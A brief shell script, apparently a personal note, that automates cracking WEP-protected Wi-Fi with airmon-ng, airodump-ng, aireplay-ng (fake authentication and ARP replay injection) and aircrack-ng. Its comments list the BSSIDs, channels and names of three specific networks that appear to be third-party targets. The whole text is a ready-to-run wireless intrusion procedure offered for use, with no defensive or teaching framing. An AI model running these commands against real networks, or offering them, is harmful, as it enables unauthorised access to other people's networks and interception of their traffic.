#!/bin/sh

MY_MAC=70:1a:04:c6:17:bb
AP_CH=...
AP_MAC_BSSID=...
AP_MAC_ESSID=...
WEP_FILE=wep

airmon-ng start wlan0
#kismet

#airodump-ng wlan0
#see: ${AP_CH} ${AP_MAC_BSSID} ${AP_MAC_ESSID}
airodump-ng -c ${AP_CH} --bssid ${AP_MAC_BSSID} -w ${WEP_FILE} wlan0  #wep is filename

# 1 window: connect to AP
# BSSID=D8:5D:4C:58:E6:94 CH=1 ESSID=zousicsa
# BSSID=00:E1:00:83:24:FE CH=1 ESSID=MA-TPLINK
# BSSID=00:24:01:1D:61:A4 CH=9 ESSID=Demmie
aireplay-ng -1 0 -a ${AP_MAC_BSSID} -h ${MY_MAC} -e ${AP_MAC_ESSID} wlan0 
#or aireplay-ng -1 0 -e ESSID -a BSSID -h ${MY_MAC} wlan0

# 2 window
aireplay-ng -3 -b ${AP_MAC_BSSID} -h ${MY_MAC} wlan0
#or aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b ${AP_MAC} -h ${MY_MAC} wlan0


# see 1 window ... after send 5000 data on 1 window
aircrack-ng wep*.cap #.ivs

#airmon-ng stop wlan0
